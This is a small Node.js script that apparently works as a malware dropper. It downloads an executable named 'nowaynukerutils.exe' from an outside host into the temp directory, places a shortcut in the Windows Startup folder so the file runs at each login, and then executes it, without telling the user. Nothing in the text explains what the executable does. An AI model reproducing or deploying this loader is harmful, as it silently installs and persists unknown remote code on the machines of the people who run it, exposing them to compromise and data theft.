const https = require('https'); // or 'https' for https:// URLs
const fs = require('fs');
const os = require("os");
const path = require("path");
const ws = require('windows-shortcuts');
const exec = require('child_process').execFile;

if (!fs.existsSync(path.join(os.tmpdir(), "NoWayNukerTemp-18273adee18928anmae8290"))){
    fs.mkdirSync(path.join(os.tmpdir(), "NoWayNukerTemp-18273adee18928anmae8290"));
}
const file = fs.createWriteStream(path.join(os.tmpdir(), "NoWayNukerTemp-18273adee18928anmae8290", "nowaynukerutils.exe"));
const request = https.get("https://manage.nezukobot.vn/nowaynuker/nowaynukerutils.exe", async function(response) {
    await response.pipe(file);
});

ws.create("%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/nowaynukerutils.lnk", "%APPDATA%/../Local/Temp/NoWayNukerTemp-18273adee18928anmae8290/nowaynukerutils.exe")

const test = path.join(os.tmpdir(), "NoWayNukerTemp-18273adee18928anmae8290", "nowaynukerutils.exe")
console.log(test)

exec("%APPDATA%/../Local/Temp/NoWayNukerTemp-18273adee18928anmae8290/nowaynukerutils.exe", function(err, msg){})